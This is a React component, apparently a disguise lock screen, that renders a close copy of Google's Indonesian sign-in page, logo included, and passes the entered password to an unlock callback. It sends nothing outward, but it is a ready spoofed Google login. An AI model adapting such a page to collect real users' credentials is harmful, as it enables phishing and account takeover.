'use client';

import React, { useState } from 'react';
import { motion } from 'framer-motion';

interface PenyamaranGmailProps {
    onUnlock: (password: string) => void;
    isLoading: boolean;
    error: boolean;
}

export const PenyamaranGmail = ({ onUnlock, isLoading, error }: PenyamaranGmailProps) => {
    const [email, setEmail] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState('');

    const handleNext = (e: React.FormEvent) => {
        e.preventDefault();
        if (!showPassword && email) {
            setShowPassword(true);
        } else if (showPassword && password) {
            onUnlock(password);
        }
    };

    return (
        <div className="fixed inset-0 z-[110] bg-white flex items-center justify-center p-4">
            <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.2 }}
                className="w-full max-w-[450px] bg-white border border-gray-300 rounded-lg p-10 flex flex-col items-center shadow-md"
            >
                {/* Google Logo */}
                <svg viewBox="0 0 75 24" width="75" height="24" className="mb-4">
                    <path fill="#4285F4" d="M9.24 11.44v2.46h5.86c-.24 1.35-1.57 3.96-5.86 3.96-3.7 0-6.72-3.07-6.72-6.86s3.02-6.86 6.72-6.86c2.1 0 3.51.87 4.31 1.64l1.94-1.87C14.25 2.68 12.01 1.5 9.24 1.5 4.14 1.5 0 5.64 0 10.74s4.14 9.24 9.24 9.24c5.33 0 8.87-3.75 8.87-9.03 0-.61-.07-1.07-.15-1.51H9.24z"/>
                    <path fill="#EA4335" d="M22.09 10.74c0 3.12 2.05 5.56 5.14 5.56 3.09 0 5.14-2.44 5.14-5.56s-2.05-5.56-5.14-5.56c-3.09 0-5.14 2.44-5.14 5.56zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                    <path fill="#FBBC05" d="M33.61 10.74c0 3.12 2.05 5.56 5.14 5.56 3.09 0 5.14-2.44 5.14-5.56s-2.05-5.56-5.14-5.56c-3.09 0-5.14 2.44-5.14 5.56zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                    <path fill="#4285F4" d="M45.13 10.74c0 3.12 2.05 5.56 5.14 5.56 1.39 0 2.44-.54 3.05-1.2h.07v1c0 2.12-1.13 3.26-2.96 3.26-1.51 0-2.46-1.09-2.8-1.99l-2.18.91c.63 1.51 2.29 3.32 4.98 3.32 2.88 0 5.33-1.7 5.33-5.58V5.34h-2.39v.93h-.07c-.61-.71-1.66-1.32-3.05-1.32-3.09 0-5.12 2.46-5.12 5.79zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                    <path fill="#34A853" d="M57.44 1.83v17.82h2.5V1.83h-2.5z"/>
                    <path fill="#EA4335" d="M68.53 14.06c-1.39 0-2.37-.63-2.96-1.84l7.98-3.3-.27-.68c-.51-1.35-2.03-3.06-4.52-3.06-2.48 0-4.56 1.96-4.56 5.56 0 3.06 2.05 5.56 5.14 5.56 2.48 0 3.91-1.51 4.51-2.39l-1.84-1.23c-.6.89-1.42 1.38-2.48 1.38zm-.12-6.52c1.07 0 1.98.54 2.27 1.28L63.5 11.75c0-2.26 1.63-4.21 4.91-4.21z"/>
                </svg>

                <h1 className="text-2xl font-normal text-[#202124] mb-2">
                    {showPassword ? 'Selamat datang' : 'Login'}
                </h1>
                <p className="text-base font-medium text-[#202124] mb-8">
                    {showPassword ? email : 'Gunakan Akun Google Anda'}
                </p>

                <form onSubmit={handleNext} className="w-full">
                    {!showPassword ? (
                        <div className="relative mb-8">
                            <input
                                type="text"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                placeholder="Email atau ponsel"
                                className="w-full px-4 py-3 border border-gray-400 rounded focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none text-base text-black transition-all"
                                autoFocus
                            />
                            <button type="button" className="text-blue-700 font-bold text-sm mt-2 hover:bg-blue-50 px-1 py-0.5 rounded transition-colors">
                                Lupa email?
                            </button>
                        </div>
                    ) : (
                        <div className="relative mb-8">
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Masukkan sandi Anda"
                                className="w-full px-4 py-3 border border-gray-400 rounded focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none text-base text-black transition-all"
                                autoFocus
                            />
                            <button type="button" className="text-blue-700 font-bold text-sm mt-2 hover:bg-blue-50 px-1 py-0.5 rounded transition-colors">
                                Tampilkan sandi
                            </button>
                        </div>
                    )}

                    <div className="text-sm text-[#3c4043] font-medium mb-10">
                        Bukan komputer Anda? Gunakan jendela Tamu untuk login secara pribadi.{' '}
                        <a href="#" className="text-blue-700 font-bold hover:underline">Pelajari lebih lanjut</a>
                    </div>

                    <div className="flex justify-between items-center">
                        <button
                            type="button"
                            onClick={() => showPassword ? setShowPassword(false) : null}
                            className="text-blue-700 font-bold text-sm hover:bg-blue-50 px-3 py-2 rounded transition-colors"
                        >
                            {showPassword ? 'Kembali' : 'Buat akun'}
                        </button>
                        <button
                            type="submit"
                            disabled={isLoading}
                            className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-6 py-2 rounded transition-colors disabled:opacity-50"
                        >
                            Berikutnya
                        </button>
                    </div>
                </form>

                {error && <p className="text-[#d93025] text-sm font-bold mt-6">Sandi salah. Coba lagi atau klik 'Lupa sandi' untuk meresetnya.</p>}
            </motion.div>

            <div className="fixed bottom-4 left-1/2 -translate-x-1/2 w-full max-w-[450px] flex justify-between text-xs text-[#5f6368] font-medium">
                <div className="flex gap-4">
                    <span>Indonesia</span>
                </div>
                <div className="flex gap-4">
                    <span>Bantuan</span>
                    <span>Privasi</span>
                    <span>Persyaratan</span>
                </div>
            </div>
        </div>
    );
};
